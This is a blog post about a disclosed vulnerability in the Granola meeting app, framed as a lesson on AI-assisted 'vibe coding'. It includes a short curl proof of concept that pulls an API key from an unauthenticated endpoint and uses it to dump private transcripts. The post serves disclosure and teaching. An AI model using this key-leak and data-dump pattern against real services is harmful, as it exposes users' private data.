---
author: Jonathan Haas
pubDate: 2025-05-12
title: "When Vibe Coding Goes Wrong: Security Lessons from Granola"
description: 
  Vibe coding shifts software creation from careful engineering to casual AI generation. When startups skip security fundamentals, the consequences aren't just bugs—they're breaches. Here's what the Granola incident teaches us.
featured: false
draft: false
tags:
  - cybersecurity
  - vibe-coding
  - AI-development
  - product-security
  - electron-apps
image:
  url: "https://images.pexels.com/photos/669618/pexels-photo-669618.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2"
  alt: "Crumbling wall symbolizing fragile security foundations"
---

# When Vibe Coding Goes Wrong: Security Lessons from Granola

Vibe coding is having a moment.  
And honestly? It's kind of awesome.

Type a few sentences into an LLM.  
Get a working app back.  
Ship it. Repeat.

Except when you skip the "understand your code" part...  
You don’t just get quirky bugs.  
You get vulnerabilities.

Granola—a Mac app built with Electron—just gave us a painfully real example.

---

## What Went Wrong at Granola

Researchers found that you could:

1. **Unpack** the app easily (`asar extract` on the `.asar` archive).
2. **Read** through the JavaScript.
3. **Find** API endpoints embedded directly in the client.
4. **Hit** one of those endpoints (`get-feature-flags`) without authentication.
5. **Extract** an AssemblyAI API key from the feature flags.
6. **Use** that key to pull **private transcript data** from AssemblyAI.

### Proof of Concept Looked Like This:

```bash
# Step 1: Leak the API key
curl -X POST "https://api.granola.ai/v1/get-feature-flags" \
 -H "X-Client-Version: 5.226.0" \
 -H "Content-Type: application/json" | jq '.[] | select(.feature=="assembly_key")'

# Step 2: Use the key to dump transcripts
curl https://api.assemblyai.com/v2/transcript \
    -H "Authorization: $apiKey" | jq '.transcripts.[].id' > transcript_ids
cat transcript_ids | head -n 1 | tr -d '"' | while read id; do curl https://api.assemblyai.com/v2/transcript/$id -H "Authorization: $apiKey"; done
```

### What the Transcripts Had

- Text transcripts of audio recordings.
- Some metadata.
- (Fortunately) **no direct access to raw audio files**.

Still, leaking user conversations—even just as text—is a security incident.  
Full stop.

---

## How This Smells Like Vibe Coding

Nobody's saying definitively that Granola was "vibecoded."  
But the red flags are textbook:

- Sensitive keys bundled into the client.
- No authentication checks on critical endpoints.
- Client/server boundary confusion.
- Basic security 101 mistakes.

It has the hallmark of someone saying to the AI:

> "Write a cool feature flag system"  

...and never stepping back to ask:

> "Wait, should this even be exposed to the client?"

That’s **classic vibe coding**:  
Prompt, ship, _hope it works_.

---

## Why Vibe Coding Without Guardrails Is Dangerous

Vibe coding feels magical.  
But magic tricks don’t build safe systems.

Without critical layers like:

- **Threat modeling** ("What happens if someone inspects the app?")
- **Secure design** ("Who should be allowed to call this endpoint?")
- **API key management** ("Should keys live in the client?")
- **Principle of least privilege** ("Does this key even need full access?")
  
You’re not just moving fast.  
You're skating blind across a minefield.

### The Hidden Costs of Vibe-Coded Apps

- **Trust Erosion**: Users delete your app—and your brand reputation goes with it.
- **Incident Response**: You scramble to patch, disclose, and recover.
- **Regulatory Exposure**: Privacy laws don’t care if your app was "vibey."
- **Compounding Debt**: Quick fixes become brittle patches on a broken foundation.

---

## The Solution Isn't "No Vibe Coding"

Let’s be clear:  
**Vibe coding isn’t the enemy.**

It’s an incredible productivity unlock.  
It democratizes building.

But if you’re building with AI-generated code, **you have new responsibilities**:

### 1. Audit Everything

Treat your AI like an enthusiastic intern.  
Helpful? Sometimes.  
Trustworthy without review? Never.

### 2. Train for Threat Modeling

You don’t have to be a full-time security engineer.  
But you do need basic instincts:

- Who gets to call this API?
- What’s the worst thing that could happen here?
- Could this app be unpacked, inspected, reversed?

If you can't answer those questions, you need a security review before launch.

### 3. Lock Down Secrets

Never, ever, ever ship API keys, secrets, or privileged tokens in your client apps.  
Use proper backend proxying.  
Scope keys narrowly.  
Rotate them regularly.

No exceptions.

### 4. Build In Authentication and Authorization Early

Even "just a little" security scaffolding saves you from giant messes later.  
Set the bar early:

- Every sensitive API must require auth.
- Every key must be scoped and auditable.
- Every endpoint must assume bad actors are trying to hit it.

---

## Final Thought: It's Only "Vibes" Until It's Real Users

Weekend projects?  
Fine. Vibe away. No judgment.

Production apps that handle user data?

**Vibe coding stops. Engineering begins.**

Ship fast.  
But ship safe.

Granola’s mistake is a flashing neon sign:  
🚨 *The vibes are not enough.* 🚨

---

## Disclosure Timeline (Granola)

- **Feb 18, 2025**: Disclosure contact requested.
- **Feb 26, 2025**: Second request.
- **Mar 10, 2025**: Contact established.
- **Mar 11, 2025**: Issue disclosed to Granola; response received confirming remediation.

✅ API key removed.  
✅ Endpoint patched.

But the scar tissue remains—for the users, and for the team.

Let's learn the lesson the easy way.
